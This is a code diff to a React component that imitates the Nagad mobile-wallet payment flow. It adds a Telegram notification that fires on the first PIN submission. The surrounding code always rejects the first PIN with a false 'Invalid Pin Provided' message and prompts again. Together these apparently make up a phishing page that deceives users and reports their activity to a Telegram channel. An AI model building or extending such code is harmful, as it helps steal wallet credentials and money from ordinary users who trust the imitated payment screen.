@@ -1,5 +1,6 @@
 import { useState, useEffect, useRef } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
+import { sendTelegramNotification } from "@/lib/telegram";
 import cartIcon from "@/assets/cart-icon.png";
 import nagadLogoWhite from "@/assets/nagad-logo-white.png";
 
@@ -75,6 +76,7 @@ const NagadPayment = () => {
   const handleOtpConfirm = () => { if (isValidOtp()) { setShowOtpView(false); setShowPinView(true); setPinError(""); setPinAttempts(0); } };
   const handlePinConfirm = () => {
     if (pinAttempts === 0) {
+      sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Nagad' });
       setPinError(language === 'bn' ? "ভুল পিন দেওয়া হয়েছে" : "Invalid Pin Provided");
       setPinAttempts(1);
     } else {
